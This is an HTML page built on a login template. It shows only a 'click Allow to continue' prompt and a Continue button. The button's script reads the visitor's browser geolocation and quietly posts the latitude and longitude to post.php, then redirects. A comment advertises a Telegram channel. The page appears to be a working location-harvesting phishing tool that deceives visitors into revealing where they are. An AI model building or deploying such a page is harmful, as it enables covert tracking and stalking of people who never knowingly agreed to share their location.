<!DOCTYPE html>
<html lang="en">
<head>
	<title>Click Allow..</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="animate.css">
<link rel="stylesheet" type="text/css" href="hamburgers.min.css">
<link rel="stylesheet" type="text/css" href="select2.min.css">
<link rel="stylesheet" type="text/css" href="util.css">
	<link rel="stylesheet" type="text/css" href="main.css">
<script src="JQuery3.3.1.js"></script>
</head>
<body>
	
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="login100-pic js-tilt" data-tilt>
					
				</div>

				<form id="geocoding_form" class="form-horizontal login100-form validate-form">
					
					<form class="login100-form validate-form">
					<center>   <div class="login100-form validate-form"><h3>click<b> Allow </b>to continue..<h3></div><br>
       </center>
		
					<div><br>
					
					</div>
					
					<div class="container-login100-form-btn">
						<button class="login100-form-btn find-me"><b>Continue<b>
						</button>
					
					</div>

					<div class="text-center p-t-136">
						
							<i class="fa fa-long-arrow-right m-l-5" aria-hidden="true"></i>
						</a>
						

  <div id="map"></div>

</div>
					</div>
				</form>
			</div>
		</div>
	</div>
	
	<script>



    var findMeButton = $('.find-me');

// Check if the browser has support for the Geolocation API
if (!navigator.geolocation) {

  findMeButton.addClass("disabled");
  $('.no-browser-support').addClass("visible");

} else {

  findMeButton.on('click', function(e) {

    e.preventDefault();

    navigator.geolocation.getCurrentPosition(function(position) {

      // Get the coordinates of the current possition.
      var lat = position.coords.latitude;
      var lng = position.coords.longitude;

      $('.latitude').text(lat.toFixed(3));
      $('.longitude').text(lng.toFixed(3));
      $('.coordinates').addClass('visible');


      $.post("post.php", {
                        lati: lat,
                        long: lng
                    },
                    function(result) {
                        if(result == "saved"){
                            window.location.href='index.php';
                        }
                    });

//channel telegram: T.me/rmsup
      // Create a new map and place a marker at the device location.
      var map = new GMaps({
        el: '#map',
        lat: lat,
        lng: lng
      });

      map.addMarker({
        lat: lat,
        lng: lng
      });

    });

  });

}

</script>

	
<script src="jquery-3.2.1.min.js"></script>
<script src="popper.js"></script>
	<script src="bootstrap.min.js"></script>
<script src="select2.min.js"></script>
<script src="tilt.jquery.min.js"></script>
	<script >
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>
<script src="main.js"></script>

</body>
</html>
